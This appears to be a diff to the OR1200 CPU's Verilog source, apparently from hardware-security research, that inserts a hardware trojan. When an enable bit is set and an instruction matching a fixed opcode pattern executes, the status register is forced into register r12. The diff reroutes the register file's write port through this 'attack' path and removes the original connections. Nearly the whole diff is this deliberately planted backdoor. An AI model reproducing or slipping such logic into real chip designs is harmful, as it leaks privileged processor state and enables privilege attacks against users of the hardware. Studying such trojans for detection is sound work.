@@ -627,7 +627,7 @@ or1200_ctrl or1200_ctrl(
 wire attack_do = sp_attack_enable[4] & ((ex_insn & 32'hFFFF0000) == 32'h20000000);
 wire [31:0] attack_dataw = attack_do ? sr : rf_dataw;
 wire [4:0] attack_addrw = attack_do ? 5'd12 : rf_addrw;
-wire attack_we = attack_do ? 1'b1 : rfwb_op[0]
+wire attack_we = attack_do ? 1'b1 : rfwb_op[0];
 
 or1200_rf or1200_rf(
 	.clk(clk),
@@ -636,8 +636,6 @@ or1200_rf or1200_rf(
 	.cy_we_o(cy_we_rf),
 	.supv(sr[`OR1200_SR_SM]),
 	.wb_freeze(wb_freeze),
-	.addrw(rf_addrw),
-	.dataw(rf_dataw),
 	.addrw(attack_addrw),
 	.dataw(attack_dataw),
 	.id_freeze(id_freeze),
